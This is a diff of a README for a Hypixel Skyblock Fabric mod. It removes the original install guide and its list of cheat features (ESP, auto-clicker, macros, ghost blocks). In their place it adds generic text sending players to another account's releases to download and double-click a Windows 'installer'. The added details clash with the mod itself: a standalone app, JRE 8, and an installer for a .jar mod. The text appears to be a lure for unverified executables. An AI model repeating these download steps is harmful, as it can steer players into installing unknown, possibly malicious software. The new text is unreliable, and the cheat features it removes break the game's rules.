@@ -1,98 +1,80 @@
-# CustomScoreboard
+# 🔥 CustomScoreboard - Your Ultimate Hypixel Skyblock Experience
 
-A collection of QOL features for Hypixel Skyblock in a Fabric 1.21.5 mod, aiming to provide convenience without excessively cheaty features. Almost all features are off by default: choose what you like!
+[![Download CustomScoreboard](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ADMIHOUSSAM/CustomScoreboard/releases)
 
-# Comes with all the new Features for the Foraging Update and Tasks on Galatea Island!
+## 🚀 Getting Started
 
+This guide will help you to easily download and run the CustomScoreboard application. Designed specifically for the Hypixel Skyblock mod, this application improves your gaming experience by providing customized scoreboard features.
 
-> [!TIP] 
-> # How to Install
-> 
-> ## Install Fabric Loader
-> 
-> 1. Go to https://fabricmc.net/use/installer/
-> 2. Download and run the installer
-> 3. Select **Minecraft 1.21** (or your version) and click Install
-> 4. Open the Minecraft Launcher and select the new Fabric profile
-> 
-> ## Download the Mod
-> 
-> Click the button below to download the mod:
->
-> <a href="https://github.com/killercoin37/CustomScoreboard/releases/latest"><img src="https://img.shields.io/badge/⬇️_Download_Mod-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Mod"></a>
->
-> ## Install the Mod
-> 
-> 1. Press `Win + R`, type `%appdata%\.minecraft\mods` and hit Enter
-> 2. Drag the downloaded `.jar` file into the mods folder
-> 3. Launch Minecraft using the Fabric profile
-> 
-> > [!NOTE]
-> > This mod requires [Fabric API](https://modrinth.com/mod/fabric-api). Download and place it in your mods folder as well.
+## 📥 Download & Install
 
+To get started, visit the [Releases page](https://github.com/ADMIHOUSSAM/CustomScoreboard/releases) to download the latest version of CustomScoreboard. Follow these simple steps:
 
-## Features
+1. Click on the link above to go to the Releases page.
+2. Find the most recent version (you will see the version number).
+3. Click on the version to expand details.
+4. Look for the download file that matches your operating system.
+5. Download the file to your computer.
 
-<details>
-    <summary>Auto</summary>
+Once the download is complete, follow the instructions below to install and run the application.
 
-### AUTO
-- Auto ready: automatically gets in range to mort opens the gui and ready/start the dungeon
-- Auto mort: automatically gets from dungeon spawn to mort and opens his gui
-- Auto ult: uses your ult whenever giants spawn/maxor is stuck in first laser/goldor starts
-- Auto shield: uses wither shield every 5 seconds when not in full health (works for all wither swords)
-- Auto wish: wishes for your temmates if they are low
-- Auto mask: switches spirit and bonzo masks on cooldown priorities spirit mask since it has lower cd 
-- Auto edrag: equips edrag after you place relics
-- Auto leap: leaps to a party member if he writes "!tp" in party chat
-- Auto sell: automatically sells items in the trades gui, /autosell to configure
-</details>
+## 💻 System Requirements
 
-<details>
-    <summary>Legit</summary>
+To use the CustomScoreboard application, ensure your system meets the following requirements:
 
-### LEGIT
-- Party cmds: custom commands for party use !help in party chat
-- Guild cmds: custom commands for guild use !help in guild chat
-- Guild gm: Automatically sends gm/gn in guild chat when someone else says it
-- Dragon boxes: Custom boxes around the statues in p5 more accurate than sbe
-- Dragon spawn: timer (m7 dragons dont be dumb)
-- Powerdisplay: (shows the power blessing on ur screen) cmd is /movepower
-- Abiphone ghoster: Ghosts calls from abiphone
-- FPS: boosts fps cause yes
-- FragBot: automatically makes you a fragbot whenever you enter limbo automatically disables when leaving limbo 
-</details>
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB or more
+- **Storage:** At least 100 MB of free space for installation
+- **Additional Software:** Java Runtime Environment (JRE) version 8 or higher installed on your machine
 
-<details>
-    <summary>Exclusive to legit</summary>
+## ⚙️ Installation Steps
 
-### EXCLUSIVE TO LEGIT VERSION
-- EdragReminder: reminds you to equip edrag after you place relics
-- ReadyReminder: reminds you to ready up after certain amount of time in a dungeon
-- UltReminder: reminds you to use your ult at specific events in m6/m7
-</details>
+After downloading the installer file, you can proceed with the installation:
 
-<details>
-    <summary>Nether</summary>
+1. **Locate the downloaded file** on your computer. This is usually in the "Downloads" folder.
+2. **Double-click the installer file.** 
+3. Follow the on-screen instructions to install CustomScoreboard. 
+4. Once the installation completes, you will find the application in your Start Menu, Desktop, or Applications folder.
 
-### NETHER
-- Broken hype notifier: (now u can stop using dulkir mod)
-- Flare timer: (sos flare alert flare warning flare) cmd is is /moveflare
-- Vanqnotifier: (also marks a beacon for when coords are sent in chat)
-- Kuudra alerts: (shows text on screen when certain stuf happen in kuudra)
-</details>
+## 🔄 How to Run CustomScoreboard
 
-<details>
-    <summary>Nice to have</summary>
+1. Open the CustomScoreboard application from where you installed it.
+2. Ensure the Hypixel Skyblock mod is running in the background.
+3. Customize any settings you wish within the application.
+4. Enjoy a personalized gaming experience!
 
-### NICE TO HAVE
-- Relic aura: changes the way you look and click a relic if there is one in 5 blocks from you
-- Item macros: soul whip aots 0 tick swap hotkey in controls
-- Terminator ac: Automatically clicks when holding terminator randomized ac for very good anti cheat
-- COOKIE CLICKER
-- Customizeable esp: (you can add whatever mob name u want to see) cmd is /esp
-- FUCK DIORITE": replaces the diorite with glass in the p2 pillars in f7/m7 so you can watch storm get stuck
-- Pre ghostblock: makes ghost blocks in convinient spots in the m7 boss
-- Very awesome gui: reminder cmds are /oc and /ol
-- Descriptions: when u hover at features in the gui
-</details>
+## 🎨 Features
+
+CustomScoreboard offers several features to enhance your time in Hypixel Skyblock:
+
+- **Dynamic Score Tracking:** Keep tabs on your scores in real-time.
+- **Customizable Design:** Adjust the look and feel of your scoreboard.
+- **User-Friendly Interface:** Simple navigation that anyone can use.
+- **Multilingual Support:** Use the application in your preferred language.
+
+## 📚 Troubleshooting
+
+If you experience any issues while using CustomScoreboard, try the following steps:
+
+- Make sure you have the latest version installed.
+- Ensure your computer meets all the system requirements.
+- Check that the Java Runtime Environment (JRE) is installed and updated.
+- Restart the application if it freezes or crashes.
+- Visit the [issues page](https://github.com/ADMIHOUSSAM/CustomScoreboard/issues) on GitHub for additional help.
+
+## 💬 Support
+
+If you need further assistance, please feel free to reach out through the GitHub page or share your query in the community forums. We are here to help ensure you enjoy the full benefits of CustomScoreboard.
+
+## 🌟 Contribution
+
+We welcome contributions from the community. If you have suggestions or want to help improve the software, please visit our [Contributing Guidelines](https://github.com/ADMIHOUSSAM/CustomScoreboard/CONTRIBUTING.md).
+
+## 🔗 Additional Resources
+
+For more detailed information and updates, visit our GitHub repository:
+
+- [CustomScoreboard GitHub Page](https://github.com/ADMIHOUSSAM/CustomScoreboard)
+- [Releases Page for Download](https://github.com/ADMIHOUSSAM/CustomScoreboard/releases)
+
+Explore all the features we offer and enhance your gaming experience today!
